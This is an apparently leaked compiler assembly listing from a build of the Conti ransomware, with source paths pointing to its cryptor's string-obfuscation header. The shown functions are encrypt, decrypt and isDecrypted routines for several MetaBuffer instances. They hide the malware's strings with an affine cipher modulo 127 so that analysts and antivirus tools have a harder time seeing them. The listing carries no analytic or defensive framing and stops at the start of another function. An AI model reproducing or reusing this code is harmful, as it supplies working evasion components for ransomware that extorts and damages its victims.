?decrypt@?$MetaBuffer@$0GF@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<101,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GF@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GF@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@@std@@@@AEBAEE@Z PROC ; MetaBuffer<101,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 65	 imul	 r8d, eax, 101		; 00000065H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 24	 add	 r8d, 36			; 00000024H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GF@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<101,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GF@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GF@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@@std@@@@QEBA_NXZ PROC ; MetaBuffer<101,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GF@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<101,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 6f	 sub	 eax, 111		; 0000006fH
  00006	44 6b c0 0f	 imul	 r8d, eax, 15

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 11	 imul	 r8d, eax, 17
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 6f	 add	 r8d, 111		; 0000006fH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@@std@@@@QEBA_NXZ PROC ; MetaBuffer<17,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<17,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BN@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 2e 00 00 00	 mov	 ecx, 46			; 0000002eH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 23	 imul	 r8d, ecx, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BN@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
